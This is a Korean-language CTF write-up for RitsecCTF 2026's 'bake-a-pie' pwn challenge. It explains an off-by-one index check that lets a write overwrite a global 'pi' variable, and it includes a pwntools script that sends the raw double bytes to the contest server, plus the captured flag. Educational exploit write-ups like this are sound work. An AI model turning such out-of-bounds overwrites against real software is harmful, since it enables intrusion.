---
ctf_name: "RitsecCTF 2026"
challenge_name: "bake-a-pie"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-04-05"
points: 10
tags: [pwntools, buffer overflow]
---

# 문제명

-bake a pie

## 문제 설명

> 문제에서 주어진 설명을 여기에 작성합니다.

- Are you good at baking? I'm trying to create the perfect pi recipe, but can't quite get it right. Can you help me?
This challenge was sponsored by SkillBit.
- 문제 URL : https://ctfd.ritsec.club/challenges#Bake%20a%20Pi-55
- nc bake-a-pi.ctf.ritsec.club 1555

## 풀이

### 분석

`strings pi.bin` 명령어를 통해서 파일 내부에 정답을 입력하였을 때 나오는 문자열이 존재함을 확인하였다.
`objdump -s -j .rodata pi.bin` 명령으로 `.rodata` 섹션을 분석하여 `0x402180`에 "Yummy!" 문자열이 있음을 알 수 있었다.
`objdump -d -M intel pi.bin` 명령으로 디어셈블하면 `0x4013c9`에서 `0x402180`을 참조하며, 도달 조건은 `pi(0x404180)`의 값이 `0x402200`에 저장된 상수의 값과 일치해야했다.
`0x402200`의 hex값 `182d4454fb210940`을 little-endian double로 변환하면 3.141592653589793임을 알 수 있었다.
따라서 ingrediant change를 하는 부분에서 pi를 위의 상수값으로 바꾸어야 했다.

### 취약점

`.data` 섹션을 보면 `0x404080`부터 ingrediant 배열이 32 바이트씩 8개가 존재하였고, 바로 다음 `0x404180`에 `pi` 변수가 위치하였다.
이때 `jbe`가 0~8을 허용하므로 인덱스 8(재료 0~7 다음)은 범위를 벗어나 `pi` 변수를 직접 가르킨다.

### 익스플로잇

프로그램을 실행한다.
C를 입력하여 change ingrediant를 한 후 8을 입력하여 pi값을 변화시킨다.
이때 pi값을 입력할 때 3.141592653589793을 그대로 입력하는게 아니라 little-endian double 바이트를 직접 입력하여 `pi` 변수를 덮어쓴다.
pwntools 코드는 다음과 같다.

```python
from pwn import *

r = remote('bake-a-pi.ctf.ritsec.club', 1555)

r.sendlineafter(b'test: ', b'C')
r.sendlineafter(b'change?: ', b'8')
r.sendlineafter(b'ingredient: ', b'\x18\x2d\x44\x54\xfb\x21\x09\x40')

r.sendlineafter(b'test: ', b'T')
r.interactive()
```

## 플래그

```
RS{0ff_by_0n3_4s_e4sy_4s_4_sk1llb17_p1}
```

## 배운 점

`objdump -s -j .rodata`로 문자열의 가상 주소를 찾고, `objdump -d`에서 해당 주소를 참조하는 코드를 역참조 할 수 있다.
전역변수 배열 바로 뒤에 중요한 변수가 있을 경우 덮어쓸 수 있으므로 주의해야한다.